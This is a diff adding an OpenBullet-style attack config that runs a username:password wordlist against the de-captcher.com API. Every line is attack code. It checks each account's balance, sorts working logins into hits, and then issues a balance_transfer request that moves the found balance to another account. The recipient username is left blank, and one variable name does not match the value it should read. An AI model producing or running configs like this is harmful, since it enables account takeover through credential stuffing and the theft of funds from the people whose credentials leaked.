@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "decaptcher",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-11T01:52:43.9095418+00:00",
+  "AdditionalInfo": "",
+  "Author": "bluerar",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#L1 REQUEST POST "http://poster.de-captcher.com/" AutoRedirect=TRUE 
+  CONTENT "function=balance&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#K1 KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "00" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "<SOURCE>" Contains "-" 
+#P1 PARSE "<SOURCE>" REGEX "([\d.]+)" "[1]" Recursive=FALSE -> VAR "B" "" "" 
+#F1 FUNCTION Ceil "<B>" -> VAR "C" 
+#K2 KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "<C>" EqualTo "0" 
+  KEYCHAIN Success OR 
+    KEY "<C>" GreaterThan "0" 
+#P2 PARSE "<SOURCE>" REGEX "([\d.]+)" "[1]" Recursive=FALSE -> VAR "Bala" "" "" 
+#F2 FUNCTION Ceil "<Balance>" -> VAR "Balance" 
+#Balance_transfer REQUEST POST "http://poster.de-captcher.com/" AutoRedirect=TRUE 
+  CONTENT "function=balance_transfer&username=<USER>&password=<PASS>&sum=<B>&to_username=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
